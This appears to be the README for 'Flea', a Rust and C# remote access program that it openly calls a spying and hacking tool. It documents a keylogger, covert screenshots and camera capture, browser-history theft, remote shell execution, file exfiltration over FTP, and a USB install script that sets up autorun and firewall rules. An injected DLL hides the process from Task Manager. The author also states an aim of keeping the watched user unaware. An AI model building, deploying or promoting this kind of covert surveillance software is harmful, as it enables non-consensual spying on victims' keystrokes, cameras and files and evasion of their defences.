# Flea

Version: 0.2.1

A simple command server written in Rust.

This repository consists of three projects:

- Command Server (root)
- Simple Command Sender (flea-client)
- Flea Monitor (C#, WPF, Windows only)

The server is the main project that would be developed. The client is a test program to validate the protocol and the core functionality of the Flea Server. Flea Monitor is a GUI application for a convenient managing of the server. Unless otherwise stated, the Flea works in Linux and Windows.

![Flea Monitor](https://github.com/rozensoftware/flea/blob/master/FleaMonitor.png)

The Flea Monitor would be developed simultaneously with the Flea Server. It doesn't use the client for communication with the server. It is a standalone application for Windows only.

## Purpose

The Flea Server could be used as a spying, hacking program and/or as a remote peer for executing your special commands. The purpose can be changed according to your needs.

## Features

- Remote commands execution based on XML format
- Taking screenshots of a host
- Sending screenshot file to FTP server and/or to the client
- Uploading a file from FTP to the host
- Bash execution on a host (doesn't work perfectly on Windows)
- Key logger
- Web browsing history of Microsoft Edge, Firefox and Google Chrome
- OS process list
- Killing a process
- Simple file server
- Auto update
- Camera capture
- OS info

The content of the key logger file is cleaned during the server startup.
The capabilities of the program will be increased during the development of this software.
To update the server a new version must be uploaded to the installation location. The new file name must be flea.upd. The server will be updated on the next run automatically.

## FTP Server

One of the Flea's features is the ability to send and receive files from an FTP server. The Flea Monitor provides its own FTP server, with which The Flea Server can cooperate.
You can connect to it using user name: anonymous and any password. This is an anonymous authentication. The sharing folder is created in your TEMP folder with the name 'FleaFTP'. This folder will be probably deleted on cleaning temporary folders so have it in mind.
You can start the FTP server by selecting option from File menu. There is an option for stopping it also. It works only when the Flea Monitor is running and it is shutting down on application close.

[FubarDev FTP Server](https://github.com/FubarDevelopment/FtpServer) project has been used here.

## Command format

The Flea Server requires an XML formatted command like below:

```xml
<Command name='command_name' value='optional_value'></Command>
```

Currently supported commands are:

- **version** : returns current protocol version.
- **bash** : a host bash command. The value property has to have a command line to execute in a host.
- **ftpscreenshot** : takes a screenshots of the host and sends it to FTP server.
- **screenshot** : takes a screenshot and sends it to the caller. The client supports this and saves data into screenshot.png file name.
- **log** : reads current key logger file and sends its content to receiver.
- **proclist** : displays currently running processes in the system.
- **kill** : kills a process. 'value' parameter must include PID.
- **upload** : uploads a file to the host from FTP server. The file name must be specified in the 'value' parameter of the XML command.
- **dir** : Retreives content of current directory.
- **cd** : Changes the current directory to the new one passed in the 'value' parameter (.. means level up).
- **getfile** : Downloads a file passed in the 'value' parameter to the client. The file is read from the current path on the server.
- **setftp** : Sets new FTP parameters: address, user name, password. Parameters must be provided in the 'value' in the following format, e.g. 127.0.0.1;user;my_pass .
- **history** : Reads web browsers history of a user which flea process is running for: Edge (Windows only), Firefox and Google Chrome. Data returned is: URL, Title and Visits Number.
- **camera** : Captures one frame (or two seconds long movie on Windows) from camera. The 'value' parameter must have a filename e.g.: frame.jpg (or movie.wmv on Windows). The server with Flea must have a camera installed.
- **sysinfo** : Gets system info
- **quit** : Quits the program. Must be run again.

New commands will be added later.

## Flea Client

The client is used for testing, but can also be used to send commands to the Flea Server.

These are the example commands:

Get current version of the Flea Server:

```bash
./flea-client -a 127.0.0.1 -c version
```

Take screenshot and send it to the FTP server:

```bash
./flea-client -a 127.0.0.1 -c ftpscreenshot
```

Take screenshot and send it to the caller. It'll be saved as screenshot.png file:

```bash
./flea-client -a 127.0.0.1 -c screenshot
```

Upload test.txt file from FTP server to the host where Flea Server is running on (test.txt file must exist on FTP server already):

```bash
./flea-client -a MY_SERVER_NAME -c upload -v test.txt
```

Change current directory to the previous one:

```bash
./flea-client --address MY_SERVER -c cd -v ..
```

Get camera frame:

```bash
./flea-client --a 192.168.0.1 -c camera -v frame.jpg
```

## Building

Except having installed Rust on Linux you also need to install the following packages to build the software:

```text
build-essential, pkg-config, libx11-dev, libxcb-randr0-dev, libxcb-shm0-dev, libv4l-dev
```

On Windows you only gonna need is Rust (with C++ compiler alongside).

If for some reason a camera capture is not needed you can exclude it from build by removing *features = ["camera"]* from cargo.toml:

```toml
flealib = {path = "flealib", features = ["camera"], version = "0.2"}
```

So, without camera the line should look like:

```toml
flealib = {path = "flealib", version = "0.2"}
```

On Windows CameraLib.dll file must be copied to the directory in which flea.exe is installed (if standard build with camera is enabled).
CameraLib.dll can be found in lib directory. This is a 64bit application tested in Windows 11 only. Should work on Widnows 10 too. It uses Microsoft Media Foundation to access the camera.

## Installation

The Flea Server reads the host name of the computer and opens a port there. The IP address can be provided by using -s parameter. If you intend to use FTP server, you will need to complete the connection data. You can do this directly in the code:

```rust
//Enter your data for FTP Server connection
const FTP_USER_NAME: &'static str = "enter_ftp_user_name";
const FTP_PASS_NAME: &'static str = "enter_ftp_user_password";
const FTP_ADDRESS_NAME: &'static str = "enter_ftp_server_ip_address";
const FTP_FOLDER_NAME: &'static str = "enter_ftp_folder_name";

```

or in the created configuration file (recommended). On Linux you will find the configuration file in a directory: /home/user_name/.config/flea_conf/ .
These parameters can be also changed remotely by sending *setftp* command.

Build The Flea server:

```bash
cargo build --release
```

There are various methods of running and installing this software, so I will not describe them here, as they depend directly on your preferences and needs.
The Flea program could be run on the target system, for example:

(I assume that you are typing commands in the same directory where the server executable file is located.)

```bash
./flea &
```

This run the server as a separate process.
On Windows however, you can uncomment line 1 in main.rs.

If you'd like to see debug output from the process run the command:

```bash
RUST_LOG=debug ./flea
```

You can specify IP address on which the server will be listen on:

```bash
./flea -s 127.0.0.1
```

The port number is sewn into the program code. It can be changed there or a new functionality could be written to specify it as a command parameter.
If you ran the server in the console you can stop it by CTRL-C.

If you need a fast installation on a computer try using *installflea.ps1* script located in install folder. All you wanna do is to copy flea.exe, CameraLib.dll, HideProcessHook.dll and installflea.ps1 into USB pendrive, connect it to computer you want to install the software on and run as administrator the script. The Flea will be installed automatically. New autorun task and new firewall rule will be created for you.
You can modify the script further to achive the functonality you want.
This script will work only on Windows and in PowerShell environment.
Unfortunately you will probably see a message about permission to access the network. You should confirm.

It is not mandatory to copy the HideProcessHook.dll file. But if you want to take advantage of hiding the program in the Windows, it must be placed in the application directory.
It'll be injected to Task Manager to hide the flea.exe process. This is possible only when flea.exe is running in elevated privileges. That is why install script tries to register autorun task as an administrator.

## Antivirus

I was able to test it on McAfee only and it blocked installation using install.ps1 script saying it is a virus (which is not completely true but I'm not going to dwell on this too much). Anyhow the installation could be problematic on some systems.

## Camera capture

The Flea Server has the ability to record a short vidoes. On Linux a single frame is taken but on Windows two seconds long video is recorded.
Currently the user can see a glowing light next to the camera when it is on. This is something to work on because we won't a user to know he was being watched.

## License

This project is licensed under either of

Apache License, Version 2.0, (LICENSE-APACHE or <http://www.apache.org/licenses/LICENSE-2.0>)
MIT license (LICENSE-MIT or <http://opensource.org/licenses/MIT>)
at your option.

## Contributing / Feedback

I am quite new to Rust. I am always glad to learn from anyone.
If you want to contribute, you are more than welcome to be a part of the project! Try to share you thoughts first! Feel free to open a new issue if you want to discuss new ideas.

Any kind of feedback is welcome!
